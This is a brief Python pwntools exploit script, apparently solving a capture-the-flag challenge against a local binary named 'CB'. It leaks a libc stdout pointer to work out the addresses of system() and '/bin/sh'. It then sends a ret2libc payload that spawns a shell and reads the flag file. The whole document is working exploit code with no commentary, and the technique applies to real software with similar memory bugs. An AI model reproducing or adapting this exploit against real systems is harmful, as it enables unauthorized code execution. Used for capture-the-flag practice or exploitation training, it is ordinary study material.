from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')

s.recvuntil('print')
s.sendline('1231')
s.sendline('A')

s.recvuntil('print')
s.sendline('3048')
s.recvuntil('\xf7')
s.recvuntil('\xf7')
leak_stdout = u32(s.recvuntil('\xf7'))
leak_libc = leak_stdout - libc.symbols['_IO_2_1_stdout_']
leak_system = leak_libc + libc.symbols['system']
leak_sh = leak_libc + list(libc.search('/bin/sh\x00'))[0]

s.recvuntil('print')
s.sendline('3282')
print 'leak: 0x%x' % (leak_libc)
s.sendline('A'*4+(p32(leak_system)+p32(leak_sh)*2)*100)
sleep(0.1)
s.sendline("echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()



